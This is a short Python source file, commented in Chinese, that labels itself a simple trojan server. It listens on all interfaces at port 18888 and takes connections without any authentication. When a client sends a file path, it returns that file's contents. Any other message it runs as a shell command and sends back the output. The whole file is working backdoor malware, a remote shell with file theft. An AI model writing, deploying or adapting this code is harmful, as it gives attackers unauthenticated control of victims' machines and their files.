#!/usr/bin/python


import socket
import sys
import os

# ===== 一个简单的木马服务端 =====


class TrojanServer:

    def __init__(self,ip,port):
        self.ip = ip # 服务端需要绑定的IP地址
        self.port = port # 服务端需要绑定的端口
        self.bufferSize= 10240 # 数据包最大值

    def start(self):

        # 创建监听
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.bind((self.ip,self.port)) # 绑定服务端IP和端口
            s.listen(12) # 监听数

            while True: # 等待客户端连接
                try:
                    conn,addr=s.accept() # 获取客户端连接
                    print('客户端连接 '+addr[0]+':'+str(addr[1])) # 打印客户端地址

                    while True:
                        data=conn.recv(self.bufferSize) # 获取客户端数据
                        if not data:
                            break
                        else:
                            # 调用解析数据函数
                           self.analyzData(conn,data)
                    conn.close()
                except socket.error as e:
                    print(e) # 打印异常信息
                    conn.close()
        finally:
            s.close() # 关闭服务端

    def analyzData(self,tcpSocket,data): # 数据解析函数
        
        try:
            msg=data.decode("utf-8") # 先对数据转码
            if os.path.isfile(msg):  # 如果是文件，则发送文件
                filesize=str(os.path.getsize(msg)) # 获取文件大小
                print("文件大小为：%s" %(filesize))
                tcpSocket.send(filesize.encode("utf-8"))#发送文件大小
                data=tcpSocket.recv(self.bufferSize)
                print("开始传输...")
                f=open(msg,'rb') #打开文件 rb 二进制方式读取文件
                for line in f:
                    tcpSocket.send(line)#发送文件内容
            
            else: # 如果是shell,则执行shell

                tcpSocket.send(('0001'+os.popen(msg).read()).encode('utf-8')) #执行shell


        except:
            raise

if __name__ == '__main__':
    s=TrojanServer("0.0.0.0",18888)
    s.start()






